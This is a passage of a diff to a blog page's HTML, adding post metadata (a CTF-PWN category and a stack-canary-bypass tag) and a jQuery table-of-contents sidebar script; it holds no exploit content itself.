+                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-09
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF-PWN/" class="post-category">
+                                    CTF-PWN
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Canary%E7%BB%95%E8%BF%87/">
+                        <span class="chip bg-color">Canary绕过</span>
                     </a>
                     
                 </div>
@@ -746,6 +885,87 @@ int main(){
 <script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
 
 
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('4'),
+            headingSelector: 'h1, h2, h3, h4, h5, h6'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
 
     
 
